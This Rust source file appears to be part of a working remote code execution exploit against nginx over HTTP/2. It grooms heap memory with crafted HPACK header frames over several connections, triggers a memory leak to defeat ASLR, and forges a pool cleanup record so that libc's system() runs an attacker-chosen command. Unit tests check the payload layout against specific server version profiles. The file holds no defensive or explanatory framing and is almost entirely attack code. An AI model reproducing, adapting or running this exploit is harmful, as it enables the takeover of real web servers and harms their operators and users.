//! Stages 3-4: preallocate the heap layout before the leak, reclaim the
//! overwritten pool on the same worker, and install the execution record.

use std::time::Duration;

use anyhow::{bail, Result};

use crate::bootstrap::CarrierState;
use crate::h2::{
    frame, hpack_integer, hpack_literal, hpack_string, headers, partial_headers,
    range_field, range_request, request_block, reset_stream,
    window_update, Name, Session,
};
use crate::leak::{
    capture_raw, extract_data_body, extract_disclosure, forge_address_disclosure,
    locate_libc_pointer_hint, resolve_elf64_symbol, select_disclosure_profile,
};
use crate::profile::Profile;
use crate::target::Config;
use crate::tls::{RawTls, StandardTls};

/// The partial HEADERS frame withholds the last byte of a length integer;
/// this is the single continuation byte that completes it.
fn withheld_tail(size: &[u8]) -> &[u8] {
    &size[size.len() - 1..]
}

#[derive(Clone, Debug)]
pub struct StreamIds {
    pub warm: u32,
    pub b: u32,
    pub c: u32,
    pub donor: u32,
    pub sink: u32,
}

pub struct PreparedReclaim {
    pub stream_ids: StreamIds,
    pub value_size: Vec<u8>,
    pub holder_name: Vec<u8>,
    pub adaptive_name: Vec<u8>,
    pub adaptive_size: Vec<u8>,
    pub deferred: bool,
    pub late_name: Vec<u8>,
    pub late_size: Vec<u8>,
}

pub struct ExecutionPlan {
    pub holder: u64,
    pub libc: u64,
    pub nginx: u64,
    pub holder_payload: Vec<u8>,
    pub adaptive_value: Vec<u8>,
    pub resolve_symbols: bool,
    pub disclosed_segments: Vec<(u64, usize)>,
    pub second_size: usize,
    pub holder_field: Vec<u8>,
    pub adaptive_field: Vec<u8>,
    pub deferred: bool,
}

/// Build the profiled B/C overlap and preallocate every auxiliary request.
pub fn prepare_copy_layout(
    session: &mut Session<RawTls>,
    auxiliaries: &mut [Session<StandardTls>],
    stream_ids: &StreamIds,
    config: &Config,
) -> Result<()> {
    let authority = &config.origin.authority;
    let http = &config.profile.http;
    let heap = &config.profile.heap;
    let path = &http.primary_path.clone().into_bytes();

    let mut warm = crate::h2::head_request_block(authority, path);
    warm.extend_from_slice(&hpack_literal(
        Name::Text(heap.warm_indexed_name.as_bytes()),
        heap.warm_indexed_value.as_bytes(),
        true,
    ));
    warm.extend_from_slice(&hpack_literal(
        Name::Index(heap.layout_header_name_index),
        &vec![b'S'; heap.warm_value_bytes],
        true,
    ));
    session.send(&headers(stream_ids.warm, &warm, true));
    session.drain("HPACK warmup", Duration::from_millis(150));
    std::thread::sleep(Duration::from_millis(100));
    session.drain("HPACK warmup idle", Duration::from_millis(100));

    let pin = {
        let mut value = hpack_integer(heap.layout_header_name_index, 4, 0);
        value.extend_from_slice(&crate::h2::huffman_repeat(
            heap.auxiliary_pin_huffman_symbol.as_bytes()[0],
            heap.auxiliary_pin_value_bytes,
        ));
        value
    };
    let mut pin_block = request_block(
        authority,
        path,
        &range_field(http.one_byte_range_start, Some(http.one_byte_range_start)),
    );
    pin_block.extend_from_slice(&hpack_literal(
        Name::Text(heap.auxiliary_indexed_name.as_bytes()),
        heap.auxiliary_indexed_value.as_bytes(),
        true,
    ));
    for _ in 0..heap.auxiliary_pin_fields {
        pin_block.extend_from_slice(&pin);
    }
    for (index, auxiliary) in auxiliaries.iter_mut().enumerate() {
        auxiliary.send(&headers(1, &pin_block, true));
        auxiliary.drain(&format!("auxiliary pin {index}"), Duration::from_millis(200));
        let response = auxiliary.responses.get(&1).cloned().unwrap_or_default();
        if response.status.as_deref() != Some("206") {
            bail!("auxiliary pin {index} failed");
        }
    }

    let mut mirrors = Vec::new();
    for _ in 0..heap.mirror_literal_count {
        mirrors.extend_from_slice(&hpack_literal(
            Name::Index(heap.layout_header_name_index),
            b"",
            false,
        ));
    }
    for _ in 0..heap.mirror_reference_count {
        mirrors.extend_from_slice(&hpack_integer(heap.mirror_reference_index, 7, 0x80));
    }
    let mut blocker = hpack_integer(heap.layout_header_name_index, 4, 0);
    blocker.extend_from_slice(&crate::h2::huffman_repeat(
        heap.layout_huffman_symbol.as_bytes()[0],
        heap.blocker_value_bytes,
    ));
    let mut drain = hpack_integer(heap.layout_header_name_index, 4, 0);
    drain.extend_from_slice(&crate::h2::huffman_repeat(
        heap.layout_huffman_symbol.as_bytes()[0],
        heap.drain_value_bytes,
    ));
    let mut common = request_block(
        authority,
        path,
        &range_field(http.layout_range_start, Some(http.layout_range_end)),
    );
    for _ in 0..heap.blocker_fields {
        common.extend_from_slice(&blocker);
    }
    common.extend_from_slice(&mirrors);
    common.extend_from_slice(&drain);

    let final_value = crate::h2::huffman_repeat(
        heap.layout_huffman_symbol.as_bytes()[0],
        heap.final_value_bytes,
    );
    let mut block = common;
    block.extend_from_slice(&hpack_integer(heap.layout_header_name_index, 4, 0));
    block.extend_from_slice(&final_value);
    let (_, encoded_size_bytes) = crate::h2::decode_hpack_integer(&final_value, 0, 7)?;
    let split = block.len() - (final_value.len() - encoded_size_bytes) - 1;
    let partial = partial_headers(stream_ids.b, block.len(), &block[..split]);
    let before = session.frames.len();
    let mut prime = frame(6, 0, 0, b"P5PRIME1");
    prime.extend_from_slice(&partial);
    session.send(&prime);
    session.wait_for(
        |session| session.received_ping_ack(before, b"P5PRIME1"),
        "B allocation prime",
        crate::limits::stage(Duration::from_secs(2)),
        Duration::from_millis(50),
    )?;
    session.send(&block[split..]);
    std::thread::sleep(Duration::from_millis(50));
    session.send(&range_request(
        stream_ids.c,
        authority,
        path,
        http.layout_range_start,
        Some(http.layout_range_end),
        b"",
    ));
    session.drain("B/C responses", Duration::from_millis(200));
    for stream in [stream_ids.b, stream_ids.c] {
        let response = session.responses.get(&stream).cloned().unwrap_or_default();
        if response.status.as_deref() != Some("206") || !response.body.is_empty() {
            bail!("B/C responses failed on {stream}");
        }
    }
    Ok(())
}

pub fn prepare_reclaim_stage(
    config: &Config,
    session: &mut Session<RawTls>,
    carrier: &CarrierState,
    auxiliaries: &mut [Session<StandardTls>],
) -> Result<PreparedReclaim> {
    let transport = &config.profile.transport;
    let heap = &config.profile.heap;
    let http = &config.profile.http;
    let first_shape_stream = carrier.first_shape_stream;
    let after_pins = first_shape_stream + 6 + 2 * transport.predecessor_pin_count as u32;
    let source_grooms = heap.source_groom_streams.unwrap_or(0) as u32;
    let stream_ids = StreamIds {
        warm: first_shape_stream,
        b: first_shape_stream + 2,
        c: first_shape_stream + 4,
        donor: after_pins,
        sink: after_pins + 2 + 2 * source_grooms,
    };
    prepare_copy_layout(session, auxiliaries, &stream_ids, config)?;

    let one_byte_owner = request_block(
        &config.origin.authority,
        &http.primary_path.clone().into_bytes(),
        &range_field(http.one_byte_range_start, Some(http.one_byte_range_start)),
    );
    let mut pins = Vec::new();
    for index in 0..transport.predecessor_pin_count {
        let stream = first_shape_stream + 6 + 2 * index as u32;
        pins.extend_from_slice(&headers(stream, &one_byte_owner, true));
    }
    session.send(&pins);
    session.drain("donor predecessor pins", Duration::from_millis(500));
    for index in 0..transport.predecessor_pin_count {
        let stream = first_shape_stream + 6 + 2 * index as u32;
        let response = session.responses.get(&stream).cloned().unwrap_or_default();
        if response.status.as_deref() != Some("206") || !response.body.is_empty() {
            bail!("donor predecessor pin {stream} failed");
        }
    }

    let donor_field = {
        let mut value = hpack_integer(heap.layout_header_name_index, 4, 0);
        value.extend_from_slice(&hpack_string(&vec![b'J'; heap.holder_value_bytes]));
        value
    };
    let mut donor_block = one_byte_owner.clone();
    donor_block.extend_from_slice(&donor_field);
    let value_size = hpack_integer(heap.holder_value_bytes, 7, 0);
    let split = one_byte_owner.len()
        + hpack_integer(heap.layout_header_name_index, 4, 0).len()
        + value_size.len()
        - 1;
    session.send_event(&partial_headers(
        stream_ids.donor,
        donor_block.len(),
        &donor_block[..split],
    ));
    std::thread::sleep(Duration::from_millis(50));

    let holder_name = hpack_integer(heap.layout_header_name_index, 6, 0x40);
    let adaptive_name = holder_name.clone();
    let adaptive_size = hpack_integer(heap.adaptive_value_bytes, 7, 0);
    let deferred = heap.deferred_execution.as_ref();
    let late_name = if deferred.is_some() { holder_name.clone() } else { Vec::new() };
    let late_size = deferred
        .map(|deferred| hpack_integer(deferred.value_bytes, 7, 0))
        .unwrap_or_default();
    let late_placeholder = deferred
        .map(|deferred| {
            let mut value = late_name.clone();
            value.extend_from_slice(&hpack_string(&vec![b'E'; deferred.value_bytes]));
            value
        })
        .unwrap_or_default();

    let mut auxiliary_block = one_byte_owner.clone();
    for _ in 0..heap.holder_fields {
        auxiliary_block.extend_from_slice(&holder_name);
        auxiliary_block.extend_from_slice(&hpack_string(&vec![b'K'; heap.holder_value_bytes]));
    }
    for _ in 0..heap.adaptive_fields {
        auxiliary_block.extend_from_slice(&adaptive_name);
        auxiliary_block.extend_from_slice(&hpack_string(&vec![b'L'; heap.adaptive_value_bytes]));
    }
    if let Some(deferred) = deferred {
        for _ in 0..deferred.fields {
            auxiliary_block.extend_from_slice(&late_placeholder);
        }
    }
    for _ in 0..heap.auxiliary_incomplete_tail_bytes {
        auxiliary_block.push(0x82);
    }
    let auxiliary_split = one_byte_owner.len() + holder_name.len() + value_size.len() - 1;
    let auxiliary_partial = partial_headers(3, auxiliary_block.len(), &auxiliary_block[..auxiliary_split]);
    for auxiliary in auxiliaries.iter_mut() {
        auxiliary.send(&auxiliary_partial);
    }
    std::thread::sleep(Duration::from_millis(50));

    let mut groom_event = Vec::new();
    let mut source_align = Vec::new();
    if source_grooms > 0 {
        let alignment = (5usize.wrapping_sub(request_block(
            &config.origin.authority,
            &http.primary_path.clone().into_bytes(),
            b"",
        )
        .len()))
            & 7;
        source_align = hpack_literal(
            Name::Index(heap.layout_header_name_index),
            &vec![b'A'; alignment],
            false,
        );
        let pattern = hex::decode(heap.source_groom_pattern.as_deref().unwrap_or("")).unwrap_or_default();
        let groom_size = heap.source_groom_value_bytes.unwrap_or(0);
        let mut groom_value = Vec::with_capacity(groom_size);
        while groom_value.len() < groom_size && !pattern.is_empty() {
            let take = (groom_size - groom_value.len()).min(pattern.len());
            groom_value.extend_from_slice(&pattern[..take]);
        }
        let mut groom_block = request_block(
            &config.origin.authority,
            &http.primary_path.clone().into_bytes(),
            &source_align,
        );
        groom_block.extend_from_slice(&hpack_literal(
            Name::Index(heap.layout_header_name_index),
            &groom_value,
            false,
        ));
        for index in 0..source_grooms {
            let stream = after_pins + 2 + 2 * index;
            groom_event.extend_from_slice(&headers(stream, &groom_block, true));
            groom_event.extend_from_slice(&reset_stream(stream));
        }
    }

    let source_path = if source_grooms > 0 {
        http.primary_path.clone()
    } else {
        http.source_path.clone().unwrap_or_else(|| http.primary_path.clone())
    };
    let mut event = donor_block[split..].to_vec();
    event.extend_from_slice(&groom_event);
    event.extend_from_slice(&range_request(
        stream_ids.sink,
        &config.origin.authority,
        &source_path.into_bytes(),
        http.one_byte_range_start,
        Some(http.one_byte_range_start),
        &source_align,
    ));
    session.send_event(&event);
    session.drain("donor and disclosure source", Duration::from_millis(500));
    for stream in [stream_ids.donor, stream_ids.sink] {
        let response = session.responses.get(&stream).cloned().unwrap_or_default();
        if response.status.as_deref() != Some("206") || !response.body.is_empty() {
            bail!("donor/source responses failed on {stream}");
        }
    }
    Ok(PreparedReclaim {
        stream_ids,
        value_size,
        holder_name,
        adaptive_name,
        adaptive_size,
        deferred: deferred.is_some(),
        late_name,
        late_size,
    })
}

pub fn capture_and_forge(
    config: &mut Config,
    session: &mut Session<RawTls>,
    carrier: &CarrierState,
    prepared: &PreparedReclaim,
) -> Result<ExecutionPlan> {
    let transport = &config.profile.transport;
    let stream_ids = &prepared.stream_ids;
    session.send(&window_update(0, carrier.tailored_update));
    let mut trigger = Vec::new();
    for _ in 0..transport.trigger_ping_count {
        trigger.extend_from_slice(&frame(6, 0, 0, b"UNSORTED"));
    }
    for _ in 0..transport.trigger_settings_count {
        trigger.extend_from_slice(&frame(4, 0, 0, b""));
    }
    trigger.extend_from_slice(&reset_stream(stream_ids.donor));
    trigger.extend_from_slice(&window_update(stream_ids.sink, 65535));
    session.send_event(&trigger);
    std::thread::sleep(Duration::from_secs(1));
    session.send(&window_update(0, transport.release_increment as u32));

    let raw = capture_raw(
        session,
        transport.disclosure_capture_bytes,
        Duration::from_millis(800),
        None,
    )?;
    if !session.is_open() {
        bail!("connection ended during disclosure capture: {:?}", session.end);
    }
    let disclosure = extract_disclosure(
        &raw,
        stream_ids.sink,
        &transport.disclosure_frame_bytes,
    )?;
    eprintln!("  captured {} bytes of memory disclosure", disclosure.len());
    let (selected, holder_offset, holder, libc, nginx) =
        select_disclosure_profile(&disclosure, &config.profiles)?;
    config.apply_profile(selected.clone());
    if heap_deferred(&selected) != prepared.deferred {
        bail!("selected profile changes preallocated deferred geometry");
    }
    eprintln!(
        "  ASLR resolved: profile={} H={holder:#x} nginx={nginx:#x} libc={libc:#x}",
        selected.name
    );

    let resolve_symbols = selected.is_address_directed();
    let mut disclosed_segments = Vec::new();
    let mut second_size = 0usize;
    let (holder_payload, adaptive_value) = if resolve_symbols {
        let libc_hint = locate_libc_pointer_hint(&disclosure, holder_offset, &selected)?;
        disclosed_segments = vec![
            (libc, 0x28000usize),
            ((libc_hint & !0xfff).wrapping_sub(0x8000), 0x9000usize),
        ];
        let mut output_segments: Vec<(u64, u64)> = disclosed_segments
            .iter()
            .map(|(address, size)| (*address, *size as u64))
            .collect();
        if let Some(last) = output_segments.last_mut() {
            last.1 += 1;
        }
        second_size = disclosed_segments.iter().map(|(_, size)| *size).sum();
        session.send(&window_update(0, second_size as u32));
        forge_address_disclosure(
            &disclosure,
            &selected,
            holder,
            nginx,
            &output_segments,
            stream_ids.c,
            &config.command,
        )?
    } else {
        build_legacy_reclaim(&selected, holder, libc, &config.command)
    };
    let holder_field = {
        let mut value = prepared.holder_name.clone();
        value.extend_from_slice(&hpack_string(&holder_payload));
        value
    };
    let adaptive_field = {
        let mut value = prepared.adaptive_name.clone();
        value.extend_from_slice(&hpack_string(&adaptive_value));
        value
    };
    Ok(ExecutionPlan {
        holder,
        libc,
        nginx,
        holder_payload,
        adaptive_value,
        resolve_symbols,
        disclosed_segments,
        second_size,
        holder_field,
        adaptive_field,
        deferred: prepared.deferred,
    })
}

fn heap_deferred(profile: &Profile) -> bool {
    profile.heap.deferred_execution.is_some()
}

fn build_legacy_reclaim(
    profile: &Profile,
    holder: u64,
    libc: u64,
    command: &[u8],
) -> (Vec<u8>, Vec<u8>) {
    let heap = &profile.heap;
    let handler = libc + profile.libc.system_offset.unwrap_or(0);
    let mut holder_payload = vec![b'K'; heap.holder_value_bytes];
    let cleanup = &heap.cleanup_record_offsets;
    holder_payload[cleanup.handler..cleanup.handler + 8]
        .copy_from_slice(&handler.to_le_bytes());
    holder_payload[cleanup.data..cleanup.data + 8]
        .copy_from_slice(&(holder + heap.callback_command_offset as u64).to_le_bytes());
    holder_payload[cleanup.next..cleanup.next + 8].copy_from_slice(&0u64.to_le_bytes());
    let command_at = heap.callback_command_offset;
    holder_payload[command_at..command_at + command.len()].copy_from_slice(command);
    holder_payload[command_at + command.len()] = 0;

    let mut pool_stub = vec![0u8; heap.pool_stub_bytes];
    pool_stub[heap.pool_field_offsets.cleanup..heap.pool_field_offsets.cleanup + 8]
        .copy_from_slice(&holder.to_le_bytes());
    let mut adaptive = vec![b'L'; heap.overlap_prefix_bytes];
    adaptive.extend_from_slice(&pool_stub);
    (holder_payload, adaptive)
}

pub fn release_and_dispatch(
    config: &Config,
    session: &mut Session<RawTls>,
    prepared: &PreparedReclaim,
    plan: &ExecutionPlan,
    auxiliaries: &mut [Session<StandardTls>],
) -> Result<()> {
    let heap = &config.profile.heap;
    let stream_ids = &prepared.stream_ids;
    let value_size = &prepared.value_size;
    let adaptive_size = &prepared.adaptive_size;
    let late_name = &prepared.late_name;
    let late_size = &prepared.late_size;
    let deferred = prepared.deferred;

    for auxiliary in auxiliaries.iter_mut() {
        // The partial HEADERS already carried every byte of the length integer
        // except its last one; the continuation must send exactly that byte.
        auxiliary.send(withheld_tail(value_size));
        auxiliary.send(&plan.holder_payload);
        for _ in 1..heap.holder_fields {
            auxiliary.send(&plan.holder_field);
        }
        auxiliary.send(&prepared.adaptive_name);
        auxiliary.send(&adaptive_size[..adaptive_size.len() - 1]);
    }
    std::thread::sleep(Duration::from_millis(50));

    let before = session.frames.len();
    let mut barrier = reset_stream(stream_ids.b);
    barrier.extend_from_slice(&frame(6, 0, 0, b"B-FREE00"));
    session.send(&barrier);
    session.wait_for(
        |session| session.received_ping_ack(before, b"B-FREE00"),
        "B free synchronization",
        crate::limits::stage(Duration::from_secs(20)),
        Duration::from_millis(50),
    )?;
    eprintln!("  B-free barrier observed; releasing {} reclaim candidates", auxiliaries.len());

    for auxiliary in auxiliaries.iter_mut() {
        auxiliary.send(&adaptive_size[adaptive_size.len() - 1..]);
        auxiliary.send(&plan.adaptive_value);
        for _ in 1..heap.adaptive_fields {
            auxiliary.send(&plan.adaptive_field);
        }
        if deferred {
            auxiliary.send(late_name);
            if late_size.len() > 1 {
                auxiliary.send(&late_size[..late_size.len() - 1]);
            }
        }
    }
    std::thread::sleep(Duration::from_millis(100));
    for auxiliary in auxiliaries.iter() {
        if !auxiliary.is_open() {
            bail!("an auxiliary connection ended during reclaim: {:?}", auxiliary.end);
        }
    }

    eprintln!("  reclaim completed; dispatching C cleanup callback");
    session.send(&reset_stream(stream_ids.c));
    if !session.is_open() {
        bail!("C reset dispatch failed: {:?}", session.end);
    }

    if plan.resolve_symbols {
        let second = capture_raw(
            session,
            plan.second_size + 65536,
            Duration::from_millis(200),
            Some(Duration::from_secs(3)),
        )?;
        let image = extract_data_body(&second, stream_ids.c, plan.second_size)?;
        let mut runtime_segments = Vec::new();
        let mut cursor = 0usize;
        for (address, size) in &plan.disclosed_segments {
            runtime_segments.push((*address, image[cursor..cursor + size].to_vec()));
            cursor += size;
        }
        let (resolved_system, runtime_libc) = resolve_elf64_symbol(&runtime_segments, "system")?;
        if runtime_libc != plan.libc {
            bail!("in-band ELF base disagrees with first leak");
        }
        eprintln!(
            "  in-band libc symbols resolved: libc={runtime_libc:#x} system={resolved_system:#x}"
        );
        if deferred {
            let deferred_cfg = config
                .profile
                .heap
                .deferred_execution
                .as_ref()
                .expect("deferred geometry");
            let late_target = plan.holder + heap.holder_user_to_pool_bytes;
            let mut execution = vec![0u8; deferred_cfg.value_bytes];
            execution[heap.pool_field_offsets.cleanup..heap.pool_field_offsets.cleanup + 8]
                .copy_from_slice(&(late_target + deferred_cfg.cleanup_record_offset as u64).to_le_bytes());
            let record = deferred_cfg.cleanup_record_offset;
            execution[record..record + 8].copy_from_slice(&resolved_system.to_le_bytes());
            execution[record + 8..record + 16]
                .copy_from_slice(&(plan.holder + heap.callback_command_offset as u64).to_le_bytes());
            execution[record + 16..record + 24].copy_from_slice(&0u64.to_le_bytes());
            execution[deferred_cfg.resolver_handler_offset..deferred_cfg.resolver_handler_offset + 8]
                .copy_from_slice(
                    &(plan.nginx
                        + config.profile.fingerprint.destroy_pool_delta.unwrap_or(0) as u64)
                        .to_le_bytes(),
                );
            let mut late_field = late_name.clone();
            late_field.extend_from_slice(&hpack_string(&execution));
            for auxiliary in auxiliaries.iter_mut() {
                auxiliary.send(withheld_tail(late_size));
                auxiliary.send(&execution);
                for _ in 1..deferred_cfg.fields {
                    auxiliary.send(&late_field);
                }
            }
            std::thread::sleep(Duration::from_secs_f64(deferred_cfg.settle_seconds));
            for auxiliary in auxiliaries.iter() {
                if !auxiliary.is_open() {
                    bail!("an auxiliary connection ended during late dispatch");
                }
            }
            eprintln!("  execution record installed; releasing the final response byte");
            session.send(&window_update(0, 1));
        }
    }
    std::thread::sleep(Duration::from_secs(2));
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profile::load_builtins;

    fn profile_1318() -> Profile {
        load_builtins().unwrap().into_iter().find(|p| p.name.contains("1.31.8")).unwrap()
    }

    #[test]
    fn withheld_length_byte_is_sent_alone() {
        // 5135 encodes as 7f 90 27 and 1023 as 7f 80 07; the partial frame
        // stops before the last byte, so the continuation must be 1 byte.
        assert_eq!(withheld_tail(&[0x7f, 0x90, 0x27]), &[0x27]);
        assert_eq!(withheld_tail(&[0x7f, 0x80, 0x07]), &[0x07]);
        assert_eq!(withheld_tail(&[0x05]), &[0x05]);
    }

    #[test]
    fn legacy_reclaim_places_system_and_command() {
        let profile = load_builtins().unwrap().into_iter().find(|p| p.name.contains("1.31.6")).unwrap();
        let (payload, adaptive) = build_legacy_reclaim(&profile, 0x5000_0001_0000, 0x7800_0000_0000, b"id");
        let cleanup = &profile.heap.cleanup_record_offsets;
        let handler = u64::from_le_bytes(payload[cleanup.handler..cleanup.handler + 8].try_into().unwrap());
        let data = u64::from_le_bytes(payload[cleanup.data..cleanup.data + 8].try_into().unwrap());
        assert_eq!(handler, 0x7800_0000_0000 + profile.libc.system_offset.unwrap());
        assert_eq!(data, 0x5000_0001_0000 + profile.heap.callback_command_offset as u64);
        assert_eq!(adaptive.len(), profile.heap.adaptive_value_bytes);
    }

    #[test]
    fn stream_ids_follow_the_reference_layout() {
        let transport = &profile_1318().transport;
        let first_shape_stream = 1000u32;
        let after_pins = first_shape_stream + 6 + 2 * transport.predecessor_pin_count as u32;
        let source_grooms = 3u32;
        assert_eq!(after_pins, 1038);
        assert_eq!(after_pins + 2 + 2 * source_grooms, 1046);
    }
}
